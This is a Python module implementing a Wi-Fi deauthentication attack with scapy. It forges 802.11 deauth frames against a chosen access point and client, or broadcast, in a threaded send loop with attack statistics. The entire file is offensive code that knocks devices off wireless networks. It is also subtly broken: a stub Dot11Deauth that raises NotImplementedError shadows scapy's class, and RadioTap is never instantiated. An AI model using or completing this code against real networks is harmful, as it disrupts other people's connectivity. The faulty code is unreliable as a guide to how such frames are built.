"""Deauthentication attack module"""
import threading
import time
from scapy.all import Dot11, RadioTap, sendp
from logger import Logger

logger = Logger("deauth")

def Dot11Deauth(reason):
    raise NotImplementedError

class DeauthAttack:
    def __init__(self, interface, ap_mac, client_mac=None):
        self.interface = interface
        self.ap_mac = ap_mac.upper()
        self.client_mac = client_mac.upper() if client_mac else None
        self._running = False
        self._thread = None
        self._attack_count = 0
        logger.info(f"DeauthAttack initialized: AP={ap_mac}, Client={client_mac}")

    def _create_deauth_frame(self, destination, source, bssid):
        """Create a deauthentication frame"""
        frame = RadioTap / Dot11(
            addr1=destination,
            addr2=source,
            addr3=bssid,
            subtype=12
        ) / Dot11Deauth(reason=7)
        return frame
    def start(self, power_level=30, frame_count=100, interval=0.1):
        """Start deauth attack"""
        if self._running:
            logger.warning("Deauth attack already running")
            return False

        try:
            self._running = True
            self._attack_count = 0
            self._thread = threading.Thread(
                target=self._attack_loop,
                args=(power_level, frame_count, interval),
                daemon=True
            )
            self._thread.start()
            logger.info(f"Deauth attack started on {self.ap_mac}")
            return True

        except Exception as e:
            logger.error(f"Failed to start deauth attack: {e}")
            self._running = False
            return False
    def _attack_loop(self, power_level, frame_count, interval):
        """Main attack"""
        try:
            while self._running:
                for _ in range(frame_count):
                    if not self._running:
                        break
                    if self.client_mac:
                        frame = self._create_deauth_frame(
                            self.client_mac, self.ap_mac, self.ap_mac
                        )
                    else:
                        frame = self._create_deauth_frame(
                            "FF:FF:FF:FF:FF:FF", self.ap_mac, self.ap_mac
                        )

                    try:
                        sendp(frame, iface=self.interface, verbose=False)
                        self._attack_count += 1
                    except:
                        pass
                time.sleep(interval)
        except Exception as e:
            logger.error(f"Error in deauth attack loop: {e}")
            self._running = False

    def stop(self):
        """Stop deauth attack"""
        if not self._running:
            logger.warning("Deauth attack not running")
            return False

        try:
            self._running = False
            if self._thread:
                self._thread.join(timeout=5)

            logger.info(f"Deauth attack stopped (sent {self._attack_count} frames)")
            return True
        except Exception as e:
            logger.error(f"Error stopping deauth attack: {e}")
            return False
    def get_stats(self):
        """Get attack statistics"""
        return {
            'running': self._running,
            'frames_sent': self._attack_count,
            'target_ap': self.ap_mac,
            'target_client': self.client_mac or 'broadcast'
        }
